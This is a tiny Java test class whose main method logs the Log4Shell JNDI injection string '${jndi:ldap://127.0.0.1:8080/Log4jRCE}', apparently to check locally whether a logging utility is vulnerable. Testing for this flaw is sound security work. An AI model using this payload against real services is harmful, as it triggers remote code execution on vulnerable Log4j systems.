/**
 * @Author: ssw
 * @DateTime: 2022/2/17 23:54
 * @Description: TODO
 */
public class Main {
    public static void main(String[] args) {
        //LoggerUtil为com.vhicool.test:test-common包中的工具类
        LoggerUtil.info("${jndi:ldap://127.0.0.1:8080/Log4jRCE}");
    }
}

